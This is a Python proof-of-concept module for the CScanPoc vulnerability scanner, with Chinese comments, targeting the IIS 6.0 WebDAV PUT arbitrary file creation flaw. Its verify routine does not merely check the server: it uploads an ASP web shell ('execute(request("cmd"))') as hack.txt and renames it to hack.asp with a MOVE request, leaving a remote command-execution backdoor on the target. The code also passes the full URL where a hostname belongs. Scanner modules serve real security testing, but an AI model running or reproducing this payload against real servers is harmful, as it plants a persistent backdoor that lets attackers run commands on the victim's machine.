# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import http.client
import urllib.parse
import socket
import sys


class Vuln(ABVuln):
    vuln_id = 'Microsoft-IIS_0002'  # 平台漏洞编号，留空
    name = 'Microsoft-IIS 6.0 PUT 任意文件创建漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INFO_LEAK  # 漏洞类型
    disclosure_date = 'Unknown'  # 漏洞公布时间
    desc = '''
        IIS配置不当导致的任意文件创建漏洞。
    '''  # 漏洞描述
    ref = 'http://www.lijiejie.com/python-iis-put-file/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Microsoft-IIS'  # 漏洞应用名称
    product_version = 'IIS 6.0'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '7cb51ce1-3d3e-4396-95b1-3cd061e817e4'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-06'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            target_parse = urllib.parse.urlparse(self.target)
            # host = socket.gethostbyname(target_parse.hostname)
            port = target_parse.port if target_parse.port else 80

            conn = http.client.HTTPConnection(self.target, port)
            conn.request(method='OPTIONS', url='/')
            headers = dict(conn.getresponse().getheaders())
            # if headers.get('server', '').find('Microsoft-IIS') < 0:
            # print 'This is not an IIS web server'

            if 'public' in headers and \
                    headers['public'].find('PUT') > 0 and \
                    headers['public'].find('MOVE') > 0:
                conn.close()
                conn = http.client.HTTPConnection(self.target, port)
                # PUT hack.txt
                conn.request(method='PUT', url='/hack.txt',
                             body='<%execute(request("cmd"))%>')
                conn.close()
                conn = http.client.HTTPConnection(self.target, port)
                # mv hack.txt to hack.asp
                conn.request(method='MOVE', url='/hack.txt',
                             headers={'Destination': '/hack.asp'})
                # print 'ASP webshell:', 'http://' + sys.argv[1] + '/hack.asp'
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
